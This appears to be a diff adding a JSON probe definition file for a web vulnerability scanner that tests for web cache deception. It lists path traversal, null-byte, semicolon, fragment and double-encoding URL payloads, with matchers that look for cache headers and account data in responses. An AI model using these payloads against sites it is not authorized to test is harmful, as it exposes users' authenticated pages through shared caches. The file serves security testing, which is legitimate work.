@@ -1,0 +1,115 @@
+{
+  "category": "web_cache_deception",
+  "contexts": {
+    "path_confusion": {
+      "description": "Web cache deception via path confusion -- append static extension to dynamic URL so cache stores authenticated response",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx", "CDN"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH/..%2fstatic.css",
+          "description": "Path traversal + static extension -- backend resolves to dynamic page, cache treats as static CSS due to extension",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"},
+            {"type": "word", "words": ["username", "email", "account", "profile", "session"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "/TARGET_PATH%00.js",
+          "description": "Null byte + static extension -- backend truncates at null byte (legacy), cache keys on full path including .js",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/TARGET_PATH/x.avif",
+          "description": "Unusual static extension (.avif, .woff2) -- CDN caches based on extension, backend ignores unknown path suffixes",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "delimiter_confusion": {
+      "description": "Web cache deception via delimiter confusion -- use semicolons, fragments, or query strings to trick cache/backend parsing",
+      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "Nginx", "Ruby on Rails", "Spring"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH;.css",
+          "description": "Semicolon path parameter with .css -- Spring/Tomcat ignores semicolons, cache keys on full path as static",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "/TARGET_PATH#.js",
+          "description": "Fragment in path -- some reverse proxies process fragment on server side while cache uses full URL as key",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "normalization_discrepancy": {
+      "description": "Web cache deception via normalization discrepancy -- exploit differences in how cache and backend normalize paths",
+      "tech_match": ["Cloudflare", "Akamai", "Fastly", "Nginx", "Apache"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH/%2e%2e/TARGET_PATH.woff",
+          "description": "Double-encoded path traversal -- cache normalizes once (keeps .woff), backend normalizes twice (resolves to dynamic page)",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/TARGET_PATH/./static.js",
+          "description": "Dot-segment in path -- backend collapses /./  to /, cache keeps the full path and caches as .js",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "method_based": {
+      "description": "Cache deception via HTTP method -- GET request with POST parameters or HEAD request caching differences",
+      "tech_match": ["Varnish", "Cloudflare", "CDN"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "GET_WITH_BODY",
+          "description": "GET request with body containing sensitive query -- cache stores response keyed on URL only, ignoring body",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        }
+      ]
+    }
+  }
+}
